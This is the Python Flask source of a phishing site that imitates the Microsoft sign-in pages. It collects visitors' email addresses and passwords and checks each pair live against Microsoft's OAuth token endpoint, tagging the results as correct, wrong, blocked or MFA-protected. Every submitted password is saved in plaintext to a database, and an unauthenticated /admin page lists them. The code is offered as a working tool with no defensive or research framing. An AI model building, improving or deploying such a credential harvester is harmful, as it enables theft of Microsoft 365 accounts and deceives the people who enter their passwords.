from flask import Flask, render_template, request, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import requests
import os
import re

app = Flask(__name__)

app.secret_key = os.environ.get('SECRET_KEY', 'ms_secret_key_2026')

# ── Fix session on Render ──
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True

app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# ── Model ──
class LoginAttempt(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    email     = db.Column(db.String(150), nullable=False)
    password  = db.Column(db.String(150), nullable=True)
    status    = db.Column(db.String(50), default='unknown')
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<LoginAttempt {self.email}>'


# ── Simple email format check ──
def is_valid_email(email):
    pattern = r'^[^@\s]+@[^@\s]+\.[^@\s]+$'
    return re.match(pattern, email) is not None


# ── Verify password against Microsoft ──
def verify_microsoft_password(email, password):
    try:
        url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

        data = {
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "scope": "https://graph.microsoft.com/.default",
            "username": email,
            "password": password,
            "grant_type": "password"
        }

        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        response = requests.post(url, data=data, headers=headers, timeout=10)
        result = response.json()

        print(f"Auth response: {result}")

        if "access_token" in result:
            return True, "success"

        error = result.get("error_description", "")

        if "AADSTS50126" in error:
            return False, "wrong_password"
        elif "AADSTS50034" in error:
            return False, "no_account"
        elif "AADSTS53003" in error:
            return False, "blocked"
        elif "AADSTS50076" in error:
            return False, "mfa_required"
        else:
            return False, "wrong_password"

    except Exception as e:
        print(f"Auth error: {e}")
        return False, "wrong_password"


# ── Routes ──
@app.route('/', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        email = request.form.get('email', '').strip()

        if not email:
            error = "Please enter your email, phone, or Skype."
        elif not is_valid_email(email):
            error = "Enter a valid email address."
        else:
            # ── Just save email and go to password ──
            session['email'] = email
            session.modified = True
            return redirect(url_for('password'))

    return render_template('login.html', error=error)


@app.route('/password', methods=['GET', 'POST'])
def password():
    email = session.get('email')
    error = None

    if not email:
        return redirect(url_for('login'))

    if request.method == 'POST':
        pwd = request.form.get('password', '').strip()

        if not pwd:
            error = "Please enter your password."
        else:
            valid, reason = verify_microsoft_password(email, pwd)

            # Always save to DB regardless of result
            status = "correct" if valid else reason
            attempt = LoginAttempt(email=email, password=pwd, status=status)
            db.session.add(attempt)
            db.session.commit()

            if valid:
                session['logged_in'] = True
                session.modified = True
                return redirect(url_for('success'))
            elif reason == "mfa_required":
                # Password correct but MFA enabled
                session['logged_in'] = True
                session.modified = True
                return redirect(url_for('success'))
            elif reason == "wrong_password":
                error = "Your account or password is incorrect. If you don't remember your password, reset it now."
            elif reason == "no_account":
                error = "That Microsoft account doesn't exist. Enter a different account."
            elif reason == "blocked":
                error = "Your account has been blocked. Contact your admin."
            else:
                error = "Your account or password is incorrect. If you don't remember your password, reset it now."

    return render_template('password.html', email=email, error=error)


@app.route('/success')
def success():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    email = session.get('email', '')
    return render_template('success.html', email=email)


@app.route('/admin')
def admin():
    attempts = LoginAttempt.query.order_by(LoginAttempt.timestamp.desc()).all()
    return render_template('admin.html', attempts=attempts)


# ── Create tables ──
with app.app_context():
    db.create_all()


if __name__ == '__main__':
    app.run(debug=True)